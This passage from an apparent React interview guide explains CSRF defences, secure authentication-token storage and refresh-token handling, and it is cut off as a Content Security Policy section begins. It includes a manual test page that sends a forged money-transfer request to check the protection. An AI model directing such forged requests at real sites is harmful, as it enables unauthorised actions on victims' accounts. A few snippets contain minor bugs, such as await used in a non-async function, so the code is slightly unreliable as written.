  // Authenticate user
  const user = await authenticate(req.body);
  
  if (user) {
    // Set secure cookie
    const cookie = serialize('session', user.sessionId, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 3600,
      path: '/',
    });
    
    res.setHeader('Set-Cookie', cookie);
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
}
```

---

#### 3. Custom Request Headers

**Require Custom Headers:**
```javascript
// Server-side (Express)
app.use((req, res, next) => {
  // Check for custom header
  if (req.method !== 'GET' && !req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Missing required header' });
  }
  next();
});
```

**React Client:**
```jsx
function SecureRequest() {
  const submitData = async (data) => {
    await fetch('/api/data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest', // Custom header
      },
      credentials: 'include',
      body: JSON.stringify(data),
    });
  };
  
  return <button onClick={() => submitData({ value: 'test' })}>Submit</button>;
}
```

**Why This Works:**
```
- Simple forms can't set custom headers
- Attacker needs JavaScript to set headers
- Same-origin policy prevents cross-origin header setting
- CORS preflight required for custom headers
```

---

#### 4. Double Submit Cookie Pattern

**How It Works:**
```
1. Server sets CSRF token in cookie
2. Client reads cookie and sends in request header
3. Server compares cookie value with header value
4. Must match or request is rejected
```

**Server Implementation:**
```javascript
const crypto = require('crypto');

// Middleware to set CSRF cookie
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrfToken', token, {
      httpOnly: false, // Must be readable by JavaScript
      sameSite: 'strict',
    });
  }
  next();
});

// Middleware to validate CSRF token
const validateCsrf = (req, res, next) => {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];
  
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  next();
};

// Protected route
app.post('/api/action', validateCsrf, (req, res) => {
  // Process request
  res.json({ success: true });
});
```

**React Client:**
```jsx
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

function ProtectedForm() {
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Read CSRF token from cookie
    const csrfToken = getCookie('csrfToken');
    
    // Send in header
    await fetch('/api/action', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      },
      credentials: 'include',
      body: JSON.stringify({ data: 'value' }),
    });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input name="data" />
      <button type="submit">Submit</button>
    </form>
  );
}
```

---

#### 5. Origin and Referer Validation

**Server-Side Validation:**
```javascript
const ALLOWED_ORIGINS = [
  'https://myapp.com',
  'https://www.myapp.com',
];

const validateOrigin = (req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  
  if (!origin) {
    return res.status(403).json({ error: 'Missing origin' });
  }
  
  try {
    const url = new URL(origin);
    const originHost = `${url.protocol}//${url.host}`;
    
    if (!ALLOWED_ORIGINS.includes(originHost)) {
      return res.status(403).json({ error: 'Invalid origin' });
    }
    
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid origin format' });
  }
};

// Apply to state-changing routes
app.post('/api/*', validateOrigin);
app.put('/api/*', validateOrigin);
app.delete('/api/*', validateOrigin);
```

---

#### 6. CORS Configuration

**Strict CORS Setup:**
```javascript
const cors = require('cors');

const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://myapp.com',
      'https://www.myapp.com',
    ];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true, // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
};

app.use(cors(corsOptions));
```

**Next.js API Route:**
```javascript
// pages/api/data.js
export default async function handler(req, res) {
  // Set CORS headers
  const origin = req.headers.origin;
  const allowedOrigins = ['https://myapp.com'];
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,X-CSRF-Token');
  }
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Handle actual request
  // ...
}
```

---

#### 7. Complete CSRF Protection Example

**Server (Express + CSRF Middleware):**
```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const session = require('express-session');

const app = express();

// Middleware
app.use(cookieParser());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Session configuration
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 3600000, // 1 hour
    },
  })
);

// CSRF protection
const csrfProtection = csrf({ cookie: true });

// Public endpoint - no CSRF needed
app.get('/api/public-data', (req, res) => {
  res.json({ data: 'public' });
});

// Get CSRF token
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected endpoints - CSRF required
app.post('/api/transfer', csrfProtection, (req, res) => {
  const { to, amount } = req.body;
  
  // Validate session
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  // Process transfer
  processTransfer(req.session.userId, to, amount);
  
  res.json({ success: true });
});

app.put('/api/profile', csrfProtection, (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  updateProfile(req.session.userId, req.body);
  res.json({ success: true });
});

app.delete('/api/account', csrfProtection, (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  deleteAccount(req.session.userId);
  res.json({ success: true });
});

// Error handler
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next(err);
});

app.listen(3000);
```

**React Client (Complete Implementation):**
```jsx
import { createContext, useContext, useState, useEffect } from 'react';

// CSRF Context
const CsrfContext = createContext();

export function CsrfProvider({ children }) {
  const [csrfToken, setCsrfToken] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    // Fetch CSRF token on mount
    fetch('/api/csrf-token', {
      credentials: 'include',
    })
      .then(r => r.json())
      .then(data => {
        setCsrfToken(data.csrfToken);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, []);
  
  return (
    <CsrfContext.Provider value={{ csrfToken, loading }}>
      {children}
    </CsrfContext.Provider>
  );
}

export function useCsrf() {
  return useContext(CsrfContext);
}

// Secure fetch wrapper
export function useSecureFetch() {
  const { csrfToken } = useCsrf();
  
  const secureFetch = async (url, options = {}) => {
    // Add CSRF token to headers
    const headers = {
      ...options.headers,
      'X-CSRF-Token': csrfToken,
    };
    
    // Ensure credentials are included
    const fetchOptions = {
      ...options,
      credentials: 'include',
      headers,
    };
    
    return fetch(url, fetchOptions);
  };
  
  return secureFetch;
}

// Protected form component
function TransferForm() {
  const { csrfToken, loading } = useCsrf();
  const secureFetch = useSecureFetch();
  
  const [formData, setFormData] = useState({
    to: '',
    amount: '',
  });
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    try {
      const response = await secureFetch('/api/transfer', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });
      
      if (response.ok) {
        alert('Transfer successful!');
        setFormData({ to: '', amount: '' });
      } else {
        const error = await response.json();
        alert(`Error: ${error.error}`);
      }
    } catch (error) {
      alert('Request failed');
    }
  };
  
  if (loading) {
    return <div>Loading...</div>;
  }
  
  if (!csrfToken) {
    return <div>Security error. Please refresh.</div>;
  }
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        type="text"
        value={formData.to}
        onChange={(e) => setFormData({ ...formData, to: e.target.value })}
        placeholder="Recipient"
        required
      />
      <input
        type="number"
        value={formData.amount}
        onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
        placeholder="Amount"
        required
      />
      <button type="submit">Transfer Money</button>
    </form>
  );
}

// App wrapper
function App() {
  return (
    <CsrfProvider>
      <TransferForm />
    </CsrfProvider>
  );
}
```

---

#### 8. CSRF Protection Best Practices

**✅ Defense in Depth:**
```javascript
// Combine multiple protections
app.use((req, res, next) => {
  // 1. Check CSRF token
  if (req.method !== 'GET' && !validateCsrfToken(req)) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  // 2. Validate origin
  if (!validateOrigin(req)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  // 3. Check custom header
  if (!req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Missing header' });
  }
  
  next();
});

// 4. Use SameSite cookies
// 5. Implement rate limiting
```

**✅ State-Changing Operations Only:**
```javascript
// CSRF protection for POST, PUT, DELETE, PATCH
const needsCsrfProtection = (method) => {
  return ['POST', 'PUT', 'DELETE', 'PATCH'].includes(method);
};

app.use((req, res, next) => {
  if (needsCsrfProtection(req.method)) {
    return csrfProtection(req, res, next);
  }
  next();
});

// GET requests don't need CSRF protection
// (but should never change state!)
```

**✅ Token Rotation:**
```javascript
// Rotate CSRF tokens periodically
app.post('/api/action', csrfProtection, (req, res) => {
  // Process request
  
  // Generate new token for next request
  const newToken = req.csrfToken();
  res.json({
    success: true,
    newCsrfToken: newToken, // Send new token
  });
});
```

---

#### 9. Testing CSRF Protection

**Manual Test:**
```html
<!-- Create test.html and open in browser -->
<html>
<body>
  <h1>CSRF Test</h1>
  <button onclick="attemptCsrf()">Attempt CSRF Attack</button>
  
  <script>
    async function attemptCsrf() {
      // Try to make request without CSRF token
      const response = await fetch('http://localhost:3000/api/transfer', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          to: 'attacker',
          amount: 1000,
        }),
      });
      
      console.log('Response:', response.status);
      // Should be 403 if CSRF protection works
    }
  </script>
</body>
</html>
```

**Automated Test:**
```javascript
const request = require('supertest');
const app = require('./app');

describe('CSRF Protection', () => {
  it('should reject POST without CSRF token', async () => {
    const response = await request(app)
      .post('/api/transfer')
      .send({ to: 'test', amount: 100 });
    
    expect(response.status).toBe(403);
  });
  
  it('should accept POST with valid CSRF token', async () => {
    // Get CSRF token
    const tokenResponse = await request(app)
      .get('/api/csrf-token');
    
    const csrfToken = tokenResponse.body.csrfToken;
    const cookie = tokenResponse.headers['set-cookie'];
    
    // Make request with token
    const response = await request(app)
      .post('/api/transfer')
      .set('Cookie', cookie)
      .set('X-CSRF-Token', csrfToken)
      .send({ to: 'test', amount: 100 });
    
    expect(response.status).toBe(200);
  });
});
```

---

#### Interview Tips

✅ **Key Points:**
- CSRF = attacker tricks browser into unwanted authenticated requests
- Primary defense: CSRF tokens (server generates, client includes in requests)
- SameSite cookies (strict/lax) prevent cross-site cookie sending
- Validate Origin/Referer headers
- Require custom headers for state-changing operations
- Combine multiple protections (defense in depth)

✅ **When to Mention:**
- Authentication/session management
- Form submissions
- API security
- Cookie handling
- State-changing operations

✅ **Common Follow-ups:**
- "How does CSRF differ from XSS?"
- "What are SameSite cookies?"
- "Can GET requests be vulnerable to CSRF?"
- "What is the double submit cookie pattern?"
- "How do you test CSRF protection?"

✅ **Perfect Answer Structure:**
1. Definition: Tricks browser into unwanted authenticated requests
2. How it works: Attacker site triggers request, browser sends cookies
3. CSRF Tokens: Server generates, client includes, server validates
4. SameSite Cookies: Prevent cross-site cookie sending (strict/lax)
5. Additional: Origin validation, custom headers
6. Implementation: Show React client fetching and using CSRF token
7. Best Practice: Multiple layers of defense

</details>

---

### 184. How do you securely handle authentication tokens?

<details>
<summary>View Answer</summary>

**Securely handling authentication tokens** requires proper storage, transmission, validation, and lifecycle management. The most common approaches are httpOnly cookies (most secure) and localStorage with careful security measures.

#### Token Storage Options

**Comparison:**
```
Storage          | Security  | CSRF Risk | XSS Risk | Notes
-----------------|-----------|-----------|----------|------------------
httpOnly Cookie  | Highest   | Yes       | No       | Best choice
localStorage     | Medium    | No        | Yes      | Accessible by JS
sessionStorage   | Medium    | No        | Yes      | Tab-scoped
Memory (state)   | High      | No        | Limited  | Lost on refresh
```

---

#### 1. httpOnly Cookies (Recommended)

**Why httpOnly Cookies?**
```
Advantages:
- Not accessible via JavaScript (XSS protection)
- Automatically sent with requests
- Secure flag ensures HTTPS only
- SameSite prevents CSRF

Disadvantages:
- Vulnerable to CSRF (mitigated with SameSite + CSRF tokens)
- Can't access token in JavaScript
- Requires same domain or CORS setup
```

**Server-Side (Express):**
```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

// Login endpoint
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Authenticate user
  const user = await authenticateUser(email, password);
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate JWT
  const token = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );
  
  // Set httpOnly cookie
  res.cookie('token', token, {
    httpOnly: true,           // Not accessible via JavaScript
    secure: process.env.NODE_ENV === 'production', // HTTPS only
    sameSite: 'strict',       // CSRF protection
    maxAge: 3600000,          // 1 hour
    path: '/',
  });
  
  res.json({
    success: true,
    user: { id: user.id, email: user.email },
  });
});

// Protected endpoint
app.get('/api/profile', authenticateToken, (req, res) => {
  res.json({ user: req.user });
});

// Logout
app.post('/api/logout', (req, res) => {
  res.clearCookie('token');
  res.json({ success: true });
});

// Middleware to verify token
function authenticateToken(req, res, next) {
  const token = req.cookies.token;
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid token' });
  }
}

app.listen(3000);
```

**React Client:**
```jsx
import { useState } from 'react';

function Login() {
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });
  
  const handleLogin = async (e) => {
    e.preventDefault();
    
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      credentials: 'include', // Important! Include cookies
      body: JSON.stringify(credentials),
    });
    
    if (response.ok) {
      const data = await response.json();
      // Token is stored in httpOnly cookie automatically
      console.log('Logged in:', data.user);
      // Redirect to dashboard
    }
  };
  
  return (
    <form onSubmit={handleLogin}>
      <input
        type="email"
        value={credentials.email}
        onChange={(e) => setCredentials({ ...credentials, email: e.target.value })}
        placeholder="Email"
      />
      <input
        type="password"
        value={credentials.password}
        onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
        placeholder="Password"
      />
      <button type="submit">Login</button>
    </form>
  );
}

// Make authenticated requests
function Profile() {
  const [profile, setProfile] = useState(null);
  
  useEffect(() => {
    fetch('/api/profile', {
      credentials: 'include', // Include cookies
    })
      .then(r => r.json())
      .then(data => setProfile(data.user));
  }, []);
  
  const handleLogout = async () => {
    await fetch('/api/logout', {
      method: 'POST',
      credentials: 'include',
    });
    // Redirect to login
  };
  
  if (!profile) return <div>Loading...</div>;
  
  return (
    <div>
      <h1>Welcome, {profile.email}</h1>
      <button onClick={handleLogout}>Logout</button>
    </div>
  );
}
```

---

#### 2. localStorage (With Precautions)

**When to Use:**
```
- Need to access token in JavaScript
- Cross-domain authentication
- Mobile apps / Electron
- With proper XSS protection
```

**Secure localStorage Implementation:**
```jsx
import { useState, useEffect, createContext, useContext } from 'react';

// Auth Context
const AuthContext = createContext();

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  // Load token on mount
  useEffect(() => {
    const token = localStorage.getItem('token');
    if (token) {
      // Validate token
      validateAndLoadUser(token);
    } else {
      setLoading(false);
    }
  }, []);
  
  const validateAndLoadUser = async (token) => {
    try {
      const response = await fetch('/api/me', {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });
      
      if (response.ok) {
        const userData = await response.json();
        setUser(userData);
      } else {
        // Invalid token
        localStorage.removeItem('token');
      }
    } catch (error) {
      localStorage.removeItem('token');
    } finally {
      setLoading(false);
    }
  };
  
  const login = async (email, password) => {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, password }),
    });
    
    if (response.ok) {
      const data = await response.json();
      // Store token
      localStorage.setItem('token', data.token);
      setUser(data.user);
      return { success: true };
    }
    
    return { success: false };
  };
  
  const logout = () => {
    localStorage.removeItem('token');
    setUser(null);
  };
  
  return (
    <AuthContext.Provider value={{ user, login, logout, loading }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  return useContext(AuthContext);
}

// Secure fetch wrapper
export function useSecureFetch() {
  const secureFetch = async (url, options = {}) => {
    const token = localStorage.getItem('token');
    
    if (!token) {
      throw new Error('No authentication token');
    }
    
    const headers = {
      ...options.headers,
      'Authorization': `Bearer ${token}`,
    };
    
    const response = await fetch(url, {
      ...options,
      headers,
    });
    
    // Handle token expiration
    if (response.status === 401) {
      localStorage.removeItem('token');
      window.location.href = '/login';
    }
    
    return response;
  };
  
  return secureFetch;
}

// Usage
function Dashboard() {
  const { user, logout } = useAuth();
  const secureFetch = useSecureFetch();
  const [data, setData] = useState(null);
  
  useEffect(() => {
    loadData();
  }, []);
  
  const loadData = async () => {
    const response = await secureFetch('/api/data');
    const result = await response.json();
    setData(result);
  };
  
  return (
    <div>
      <h1>Welcome, {user.email}</h1>
      <button onClick={logout}>Logout</button>
      {data && <pre>{JSON.stringify(data, null, 2)}</pre>}
    </div>
  );
}
```

---

#### 3. Refresh Token Pattern

**Why Refresh Tokens?**
```
- Short-lived access tokens (15 minutes)
- Long-lived refresh tokens (7 days)
- Access token in memory or short-lived cookie
- Refresh token in httpOnly cookie
- Minimizes risk if access token stolen
```

**Server Implementation:**
```javascript
const jwt = require('jsonwebtoken');

// Login endpoint
app.post('/api/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate tokens
  const accessToken = jwt.sign(
    { userId: user.id },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' } // Short-lived
  );
  
  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' } // Long-lived
  );
  
  // Store refresh token in database
  await storeRefreshToken(user.id, refreshToken);
  
  // Set refresh token in httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  });
  
  // Return access token in response
  res.json({
    accessToken,
    user: { id: user.id, email: user.email },
  });
});

// Refresh endpoint
app.post('/api/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    
    // Check if token exists in database
    const isValid = await verifyRefreshToken(decoded.userId, refreshToken);
    if (!isValid) {
      return res.status(403).json({ error: 'Invalid refresh token' });
    }
    
    // Generate new access token
    const accessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({ accessToken });
  } catch (error) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});

// Logout
app.post('/api/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (refreshToken) {
    // Remove refresh token from database
    await revokeRefreshToken(refreshToken);
  }
  
  res.clearCookie('refreshToken');
  res.json({ success: true });
});
```

**React Client:**
```jsx
import { useState, useEffect, createContext, useContext, useRef } from 'react';

const AuthContext = createContext();

export function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState(null);
  const [user, setUser] = useState(null);
  const refreshTimeoutRef = useRef(null);
  
  const login = async (email, password) => {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ email, password }),
    });
    
    if (response.ok) {
      const data = await response.json();
      setAccessToken(data.accessToken);
      setUser(data.user);
      scheduleTokenRefresh();
      return true;
    }
    return false;
  };
  
  const refreshAccessToken = async () => {
    try {
      const response = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include',
      });
      
      if (response.ok) {
        const data = await response.json();
        setAccessToken(data.accessToken);
        scheduleTokenRefresh();
        return data.accessToken;
      }
    } catch (error) {
      console.error('Token refresh failed:', error);
    }
    
    // Refresh failed - logout
    logout();
    return null;
  };
  
  const scheduleTokenRefresh = () => {
    // Refresh token 1 minute before expiry (15min - 1min = 14min)
    const refreshTime = 14 * 60 * 1000;
    
    if (refreshTimeoutRef.current) {
      clearTimeout(refreshTimeoutRef.current);
    }
    
    refreshTimeoutRef.current = setTimeout(() => {
      refreshAccessToken();
    }, refreshTime);
  };
  
  const logout = async () => {
    await fetch('/api/logout', {
      method: 'POST',
      credentials: 'include',
    });
    
    setAccessToken(null);
    setUser(null);
    
    if (refreshTimeoutRef.current) {
      clearTimeout(refreshTimeoutRef.current);
    }
  };
  
  // Try to refresh token on mount
  useEffect(() => {
    refreshAccessToken();
  }, []);
  
  return (
    <AuthContext.Provider value={{ accessToken, user, login, logout, refreshAccessToken }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  return useContext(AuthContext);
}

// Axios interceptor for auto token refresh
import axios from 'axios';

export function setupAxiosInterceptors(getAccessToken, refreshAccessToken) {
  // Request interceptor - add token
  axios.interceptors.request.use(
    (config) => {
      const token = getAccessToken();
      if (token) {
        config.headers.Authorization = `Bearer ${token}`;
      }
      return config;
    },
    (error) => Promise.reject(error)
  );
  
  // Response interceptor - handle 401
  axios.interceptors.response.use(
    (response) => response,
    async (error) => {
      const originalRequest = error.config;
      
      // If 401 and haven't retried yet
      if (error.response?.status === 401 && !originalRequest._retry) {
        originalRequest._retry = true;
        
        // Try to refresh token
        const newToken = await refreshAccessToken();
        
        if (newToken) {
          // Retry original request with new token
          originalRequest.headers.Authorization = `Bearer ${newToken}`;
          return axios(originalRequest);
        }
      }
      
      return Promise.reject(error);
    }
  );
}
```

---

#### 4. Token Security Best Practices

**✅ Short Expiration:**
```javascript
// Access tokens: 15-60 minutes
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });

// Refresh tokens: 7-30 days
const refreshToken = jwt.sign(payload, secret, { expiresIn: '7d' });
```

**✅ Secure Token Generation:**
```javascript
const crypto = require('crypto');

// Generate secure random token
function generateSecureToken() {
  return crypto.randomBytes(32).toString('hex');
}

// JWT with strong secret
const JWT_SECRET = process.env.JWT_SECRET; // Use strong secret (256+ bits)

// Verify secret length
if (!JWT_SECRET || JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be at least 32 characters');
}
```

**✅ Token Validation:**
```javascript
function validateToken(token) {
  try {
    // Verify signature and expiration
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    
    // Check token is not blacklisted
    const isBlacklisted = await checkBlacklist(decoded.jti);
    if (isBlacklisted) {
      throw new Error('Token revoked');
    }
    
    // Check user still exists
    const user = await getUserById(decoded.userId);
    if (!user) {
      throw new Error('User not found');
    }
    
    return { valid: true, user: decoded };
  } catch (error) {
    return { valid: false, error: error.message };
  }
}
```

**✅ Token Revocation:**
```javascript
// Store refresh tokens in database
const refreshTokens = new Map(); // Use Redis in production

async function storeRefreshToken(userId, token) {
  await db.refreshTokens.create({
    userId,
    token,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  });
}

async function revokeRefreshToken(token) {
  await db.refreshTokens.delete({ token });
}

async function revokeAllUserTokens(userId) {
  await db.refreshTokens.deleteMany({ userId });
}
```

**✅ JWT Claims:**
```javascript
// Include important claims
const payload = {
  // Standard claims
  sub: user.id,              // Subject (user ID)
  iat: Math.floor(Date.now() / 1000), // Issued at
  exp: Math.floor(Date.now() / 1000) + 900, // Expiration (15 min)
  jti: generateSecureToken(), // JWT ID (for revocation)
  
  // Custom claims
  email: user.email,
  role: user.role,
  permissions: user.permissions,
};

const token = jwt.sign(payload, process.env.JWT_SECRET);
```

---

#### 5. Complete Secure Authentication Example

**Environment Variables:**
```bash
# .env
ACCESS_TOKEN_SECRET=your-very-long-random-access-token-secret-here-min-256-bits
REFRESH_TOKEN_SECRET=your-very-long-random-refresh-token-secret-here-min-256-bits
NODE_ENV=production
```

**Server (Complete):**
```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();

// Security middleware
app.use(helmet());
app.use(cookieParser());
app.use(express.json());

// Rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts',
});

// Login
app.post('/api/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  
  // Validate input
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password required' });
  }
  
  // Get user
  const user = await db.users.findOne({ email });
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Verify password
  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate tokens
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' }
  );
  
  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' }
  );
  
  // Store refresh token
  await db.refreshTokens.create({
    userId: user.id,
    token: refreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  });
  
  // Set httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });
  
  res.json({
    accessToken,
    user: {
      id: user.id,
      email: user.email,
      role: user.role,
    },
  });
});

// Refresh token
app.post('/api/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // Verify token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    
    // Check if stored
    const stored = await db.refreshTokens.findOne({
      userId: decoded.userId,
      token: refreshToken,
    });
    
    if (!stored) {
      return res.status(403).json({ error: 'Invalid refresh token' });
    }
    
    // Generate new access token
    const user = await db.users.findById(decoded.userId);
    const accessToken = jwt.sign(
      { userId: user.id, email: user.email, role: user.role },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({ accessToken });
  } catch (error) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});

// Logout
app.post('/api/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (refreshToken) {
    // Remove from database
    await db.refreshTokens.deleteOne({ token: refreshToken });
  }
  
  res.clearCookie('refreshToken');
  res.json({ success: true });
});

// Auth middleware
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid or expired token' });
  }
}

// Protected route
app.get('/api/profile', authenticateToken, async (req, res) => {
  const user = await db.users.findById(req.user.userId);
  res.json({ user });
});

app.listen(3000);
```

---

#### Interview Tips

✅ **Key Points:**
- httpOnly cookies = most secure (not accessible via JS, XSS protection)
- localStorage = vulnerable to XSS, use only with strong XSS protections
- Refresh token pattern: short-lived access tokens + long-lived refresh tokens
- Always use HTTPS, secure flags, SameSite cookies
- Implement token expiration and rotation
- Store sensitive tokens server-side or in httpOnly cookies

✅ **When to Mention:**
- Authentication implementation
- Session management
- Security discussions
- JWT vs sessions debate
- API security

✅ **Common Follow-ups:**
- "localStorage vs httpOnly cookies for tokens?"
- "What is the refresh token pattern?"
- "How do you handle token expiration?"
- "What are JWT claims?"
- "How do you revoke tokens?"

✅ **Perfect Answer Structure:**
1. Storage Options: httpOnly cookies (best), localStorage (with caution)
2. httpOnly Advantages: XSS protection, automatic sending, secure
3. Refresh Pattern: Short access tokens (15min) + long refresh tokens (7d)
4. Security: HTTPS, secure flag, SameSite, short expiration
5. Implementation: Show login endpoint setting httpOnly cookie
6. Client: credentials: 'include' to send cookies
7. Best Practice: Use httpOnly cookies when possible, refresh token rotation

</details>

---

### 185. What is Content Security Policy (CSP) and React?

<details>
<summary>View Answer</summary>

**Content Security Policy (CSP)** is a security layer that helps prevent XSS, data injection, and other code injection attacks by specifying which sources of content are trusted. In React applications, CSP requires careful configuration to work with inline scripts and styles while maintaining security.

#### Understanding CSP

**What is CSP?**
```
Definition:
- HTTP header that controls resource loading
- Whitelist of trusted sources for scripts, styles, images, etc.
- Browser enforces the policy
- Reduces XSS attack surface

How it works:
1. Server sends CSP header
2. Browser receives policy
3. Browser blocks unauthorized resources
4. Violations can be reported
```

**CSP Header Example:**
```
